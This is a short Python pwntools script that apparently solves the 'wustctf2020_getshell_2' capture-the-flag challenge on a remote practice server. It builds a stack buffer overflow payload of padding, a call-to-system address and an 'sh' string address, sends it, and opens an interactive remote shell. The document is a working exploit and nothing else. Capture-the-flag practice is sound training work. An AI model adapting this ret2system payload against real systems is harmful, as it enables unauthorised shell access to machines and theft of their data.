#coding:utf-8
from pwn import *
import pwnlib
context.log_level = 'debug'
# sh = process("./wustctf2020_getshell_2")
sh = remote("node3.buuoj.cn",27888)
elf = ELF("./wustctf2020_getshell_2")
call_system = 0x08048529
sh_addr = 0x08048670
payload = 'a' * 28 + p32(call_system) + p32(sh_addr)
sh.sendline(payload)
sh.interactive()